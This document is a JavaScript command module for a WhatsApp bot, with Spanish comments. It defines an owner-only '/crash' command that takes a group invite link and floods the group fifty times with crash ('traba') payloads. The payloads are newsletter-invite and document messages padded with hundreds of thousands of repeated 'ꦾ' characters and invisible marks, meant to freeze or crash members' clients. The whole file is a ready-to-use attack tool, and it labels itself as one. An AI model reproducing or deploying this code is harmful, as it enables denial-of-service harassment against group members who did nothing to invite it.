export default {
  command: ['crash'],
  category: 'owner',
  isOwner: true,
  run: async (client, m) => {
    // Obtenemos el texto directamente de 'm' como lo hace tu bot
    const text = m.text || m.body || m.message?.conversation || m.message?.extendedTextMessage?.text || ''
    
    // Verificación de enlace
    if (!text || !text.includes('whatsapp.com')) {
      return client.sendMessage(m.key.remoteJid, { 
        text: `😿 Debes proporcionar el enlace del grupo.\nEjemplo: */crash* https://chat.whatsapp.com/XXXX` 
      }, { quoted: m })
    }

    const match = text.match(/chat\.whatsapp\.com\/([\w\d]+)/i)
    if (!match) return client.sendMessage(m.key.remoteJid, { text: '😡 Enlace inválido.' }, { quoted: m })

    const inviteCode = match[1]
    let groupId

    try {
      const res = await client.groupGetInviteInfo(inviteCode)
      groupId = res.id
    } catch (e) {
      return client.sendMessage(m.key.remoteJid, { 
        text: "⚠️ No se pudo obtener el ID del grupo." 
      }, { quoted: m })
    }

    // --- FUNCIONES DE ATAQUE ---
    const canalKillGrupo = async () => {
      const basura = 'ꦾ'.repeat(90000)
      await client.relayMessage(groupId, {
        newsletterAdminInviteMessage: {
          newsletterJid: "120363229729656123@newsletter",
          newsletterName: "ADOi" + basura.repeat(3),
          jpegThumbnail: Buffer.from('/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAYEBQYFBAYGBQYHBwYIChAKCgkJChQODwwQFxQYGBcUFhYaHSUfGhsjHBYWICwgIyYnKSopGR8tMC0oMCUoKSj/2wBDAQcHBwoIChMKChMoGhYaKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCj/wAARCAA7ADsDASIAAhEBAxEB/8QAFQABAQAAAAAAAAAAAAAAAAAAAAr/xAAUEAEAAAAAAAAAAAAAAAAAAAAA/8QAFAEBAAAAAAAAAAAAAAAAAAAAAP/EABQRAQAAAAAAAAAAAAAAAAAAAAD/2gALAwEAAhEDEQA/AJVAAAAAAAAAAAAAAAAAAAAAA//2Q==', 'base64'),
          caption: "El mDKDNND",
          inviteExpiration: `${Math.floor(Date.now() / 1000) + 3600}`
        }
      }, {})
    }

    const docKillGrupo = async (i) => {
      const traba = 'ꦾ'.repeat(90000)
      const contenido = '\u200E'.repeat(5000) + i
      await client.sendMessage(groupId, {
        document: Buffer.from(contenido),
        fileName: `ado 🔥_${i + 1}`.repeat(2),
        mimetype: 'application/msword',
        caption: traba.repeat(3)
      })
    }

    // --- INICIO DEL CICLO ---
    await client.sendMessage(m.key.remoteJid, { text: `✅ Iniciando ataque: ${groupId}` }, { quoted: m })

    const delayMs = 9000
    for (let i = 0; i < 50; i++) {
      await canalKillGrupo()
      await new Promise(r => setTimeout(r, delayMs))
      await docKillGrupo(i)
      await new Promise(r => setTimeout(r, delayMs))
    }

    await client.sendMessage(m.key.remoteJid, { 
      text: `✅ Proceso finalizado en ${groupId}.` 
    }, { quoted: m })
  }
}
